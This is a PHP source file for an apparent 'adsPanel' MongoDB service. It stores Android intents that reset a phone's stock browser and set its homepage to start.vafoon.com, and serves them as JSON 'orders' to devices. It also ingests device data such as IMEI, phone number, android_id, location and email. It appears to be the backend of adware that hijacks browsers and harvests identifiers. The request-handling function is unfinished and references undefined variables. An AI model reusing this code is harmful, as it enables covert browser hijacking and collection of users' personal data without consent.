<?php

/*
 * To change this template, choose Tools | Templates
 * and open the template in the editor.
 */

/**
 * Description of MongoService
 *
 * @author tuguu
 */

namespace adsPanel\BackendBundle\Services;

use adsPanel\BackendBundle\Document\Respuesta;
use adsPanel\BackendBundle\Document\Phone_Model;
use adsPanel\BackendBundle\Document\Fabricant;
use adsPanel\BackendBundle\Document\Language;
use adsPanel\BackendBundle\Document\Network_Operator;
use adsPanel\BackendBundle\Document\App_Android;
use adsPanel\BackendBundle\Document\Country;
use adsPanel\BackendBundle\Document\Request;

class MongoService {

    protected $managerMongo;

    public function __construct($mongo) {
        $this->managerMongo = $mongo->getManager();
    }

    /* Here initialize te constant values to the db, for the Document Respuesta */

    public function initValues() {
        $URL_REDIRECT = 'start.vafoon.com';
        $intent = new Respuesta();
        $intent->setIdentificador('receiver');
        $intent->setIntent('android.intent.action.MULTI_CSC_CLEAR');
        $intent->setPaquete('com.android.browser');
        $intent->setComponente('com.android.browser.BrowserHomepageSetReceiver');
        $this->managerMongo->persist($intent);
        $intent = new Respuesta();
        $intent->setIdentificador('homepage');
        $intent->setIntent('android.intent.action.OMADM_BROWSER_SET_HOMEPAGE');
        $intent->setAtributo('homepage');
        $intent->setValor($URL_REDIRECT);
        $this->managerMongo->persist($intent);
        $this->managerMongo->flush();
        //TODO inicializar valores constantes de tablas como paises, idiomas, etc...
    }

    public function getJSONordersToAndroid() {
        $repository = $this->managerMongo->getRepository('BackendBundle:Respuesta');
        $intent1 = $repository->findOneByIdentificador('receiver');
        $intent2 = $repository->findOneByIdentificador('homepage');
        $array = array(
            $intent1->getIdentificador() => array(
                'intent' => $intent1->getIntent(),
                'paquete' => $intent1->getPaquete(),
                'componente' => $intent1->getComponente()
            ),
            $intent2->getIdentificador() => array(
                'intent' => $intent2->getIntent(),
                'atributo' => $intent2->getAtributo(),
                'valor' => $intent2->getValor()
            )
        );
        return json_encode($array);
    }

    public function insertLanguage($name_language) {
        $result = $this->managerMongo->getRepository('BackendBundle:Language')->findOneByLanguage($name_language);
        //CHECK IF EXISTS THE FIELD
        if ($result) {
            $language = $result;
        } else {
            $language = new Language();
            $language->setLanguague($name_language);
            $this->managerMongo->persist($language);
            $this->managerMongo->flush();
        }
        return $language;
    }

    public function insertNetworkOperator($name) {
        $result = $this->managerMongo->getRepository('BackendBundle:Network_Operator')->findOneByName($name);
        //CHECK IF EXISTS THE FIELD
        if ($result) {
            $network = $result;
        } else {
            $network = new Network_Operator();
            $network->setName($name);
            $this->managerMongo->persist($network);
            $this->managerMongo->flush();
        }
        return $network;
    }

    public function insertCountry($name) {
        $result = $this->managerMongo->getRepository('BackendBundle:Country')->findOneByName($name);
        //CHECK IF EXISTS THE FIELD
        if ($result) {
            $country = $result;
        } else {
            $country = new Country();
            $country->setName($name);
            $this->managerMongo->persist($country);
            $this->managerMongo->flush();
        }
        return $country;
    }

    public function insertFabricant($name) {
        $result = $this->managerMongo->getRepository('BackendBundle:Fabricant')->findOneByName($name);
        //CHECK IF EXISTS THE FIELD
        if ($result) {
            $fabricant = $result;
        } else {
            $fabricant = new Fabricant();
            $fabricant->setName($name);
            $this->managerMongo->persist($fabricant);
            $this->managerMongo->flush();
        }
        return $fabricant;
    }

    public function insertPhoneModel($name, $name_fabricant) {
        $result = $this->managerMongo->getRepository('BackendBundle:Phone_Model')->findOneByPhoneModel($name);
        //CHECK IF EXISTS THE FIELD
        if ($result) {
            $model = $result;
        } else {
            $model = new Phone_Model();
            $model->setPhoneModel($name);
            $model->setFabricant($this->insertFabricant($name_fabricant));
            $this->managerMongo->persist($model);
            $this->managerMongo->flush();
        }
        return $model;
    }

    public function insertApp($name, $package, $version) {
        $result = $this->managerMongo->getRepository('BackendBundle:App_Android')->findOneBy(array('name_app' => $name, 'package_name' => $package, 'version_app' => $version));
        //CHECK IF EXISTS THE FIELD
        if ($result) {
            $app = $result;
        } else {
            $app = new App_Android();
            $app->setNameApp($name);
            $app->setPackageName($package);
            $app->setVersionApp($version);
            $this->managerMongo->persist($app);
            $this->managerMongo->flush();
        }
        return $app;
    }

    public function insertRequestByJSON($json) {
        $sdk=$json['sdk_version'];
        $model=$this->insertPhoneModel($json['model_phone'],$json['fabricant_phone']);
        $network=$this->insertNetworkOperator($json['network_operator']);
        $json['imei'];
        $json['phone_number'];
        $language=$this->insertLanguage($json['language']);
        $country=$this->insertCountry($json['country']);
        $app=$this->insertApp($json['name_app'], $json['package_name'], $json['version_app']);
        $json['wifi'];
        $json['android_id'];
        $json['sd'];
        $json['screen_size'];
        $json['isTablet'];
        $json['network_subtype'];
        $result = $this->managerMongo->getRepository('BackendBundle:Request')->findOneBy(array('name_app' => $name, 'package_name' => $package, 'version_app' => $version));


        if (isset($json['latitude'])) {
            
        }
        if (isset($json['longitude'])) {
            
        }
        if (isset($json['email'])) {
            
        }
    }

}

?>
